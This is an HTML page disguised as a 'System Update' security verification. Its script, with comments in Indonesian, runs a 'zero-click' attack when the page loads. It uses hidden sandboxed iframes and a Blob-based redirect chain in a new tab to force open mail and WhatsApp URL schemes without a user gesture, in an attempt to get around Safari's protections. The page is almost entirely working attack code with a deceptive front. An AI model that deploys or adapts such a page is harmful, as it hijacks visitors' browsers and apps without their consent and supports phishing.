<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Update</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #f4f6f8; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; text-align: center;
  }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
  h2 { color: #333; margin-bottom: 10px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 120px; overflow-y: auto; }
  iframe { display: none; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 Security Verification</h2>
  <p>Memproses...</p>
  <div id="log">Sistem siap.</div>
</div>

<div id="launcher-container" style="display: none;"></div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var executed = false;

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // 1. TARGET SCHEMES (MACOS)
  // ============================================
  var MAIL_SCHEME = "mailto:security@apple.com?subject=Security%20Alert&body=Account%20Compromised";
  var WA_SCHEME = "whatsapp://send?text=Security%20Verification%20Required";

  // ============================================
  // 2. TRIGGER ZERO-CLICK (OTOMATIS SAAT LOAD)
  // ============================================
  window.addEventListener('load', function() {
    if (executed) return;
    executed = true;

    log("[!] Memulai Zero-Click MacOS Hijack...");

    // ============================================
    // A. IFRAME SANDBOX (BYPASS GESTURE)
    // ============================================
    // Trik: Beberapa versi Safari mengizinkan skema kustom 
    // jika dimuat di dalam iframe yang di-sandbox.
    
    setTimeout(function() {
      try {
        log("[+] Mengirim Mail via Iframe...");
        var iframe1 = document.createElement("iframe");
        iframe1.sandbox = "allow-scripts allow-top-navigation allow-popups";
        iframe1.style.display = "none";
        iframe1.src = MAIL_SCHEME;
        document.getElementById("launcher-container").appendChild(iframe1);
      } catch(e) {
        log("[-] Mail Error: " + e.message);
      }
    }, 100);

    setTimeout(function() {
      try {
        log("[+] Mengirim WhatsApp via Iframe...");
        var iframe2 = document.createElement("iframe");
        iframe2.sandbox = "allow-scripts allow-top-navigation allow-popups";
        iframe2.style.display = "none";
        iframe2.src = WA_SCHEME;
        document.getElementById("launcher-container").appendChild(iframe2);
      } catch(e) {
        log("[-] WA Error: " + e.message);
      }
    }, 500);

    // ============================================
    // B. BLOB REDIRECT CHAIN (TOP-LEVEL)
    // ============================================
    // Trik: Bungkus skema di dalam Blob, lalu buka di tab baru.
    // Safari sering menganggap ini navigasi internal.
    
    setTimeout(function() {
      log("[+] Mengirim Blob Redirect Chain...");
      try {
        var blobPayload = `
          <!DOCTYPE html>
          <html>
          <body>
            <script>
              // Redirect berantai ke Mail
              window.location.replace("${MAIL_SCHEME}");
              // Fallback ke WA setelah 500ms
              setTimeout(function() {
                window.location.replace("${WA_SCHEME}");
              }, 500);
            <\/script>
          </body>
          </html>
        `;
        var blob = new Blob([blobPayload], { type: 'text/html' });
        var blobUrl = URL.createObjectURL(blob);
        
        // Buka di tab baru
        var win = window.open(blobUrl, '_blank');
        if (win) {
          log("[+] Blob Redirect Triggered (Tab Baru).");
        } else {
          log("[-] Popup diblokir (Blob).");
        }
      } catch(e) {
        log("[-] Blob Error: " + e.message);
      }
    }, 1000);

  });

})();
</script>
</body>
</html>
